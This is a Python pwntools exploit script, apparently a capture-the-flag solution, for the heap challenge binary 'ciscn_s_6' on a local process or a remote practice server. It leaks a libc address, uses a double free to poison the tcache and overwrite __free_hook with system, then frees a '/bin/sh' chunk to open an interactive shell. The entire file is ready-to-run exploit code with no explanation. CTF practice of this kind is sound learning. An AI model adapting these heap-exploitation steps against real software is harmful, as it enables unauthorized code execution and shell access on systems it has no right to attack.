import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_s_6')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_s_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28869)
			elf=ELF('./ciscn_s_6')
			libc=ELF('../../x64libc/libc.so.6')

		def add(a,b,c):
			io.sendlineafter('choice:','1')
			io.sendlineafter('name\n',str(a))
			io.sendafter('name:\n',b)
			io.sendafter('call:\n',c) 

		def delete(a):
			io.sendlineafter('choice:','3')
			io.sendlineafter('index:\n',str(a))

		def show(a):
			io.sendlineafter('choice:','2')
			io.sendlineafter('index:\n',str(a))
		

		add(0x4f0,'aaaa','111111111111')
		add(0x40,'aaaa','111111111111')
		delete(0)
		add(0x21,'aaaaaaaa','1111')
		show(2)
		io.recvuntil('aaaaaaaa')
		__malloc_hook=u64(io.recv(6)+'\x00\x00')-96-0x10
		libc_base=__malloc_hook-libc.sym['__malloc_hook']
		libc.address=libc_base
		delete(1)
		delete(1)
		add(0x40,p64(libc.sym['__free_hook']),'1111')
		add(0x40,'/bin/sh\x00','1111')
		add(0x40,p64(libc.sym['system']),'1111')


		delete(4)



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue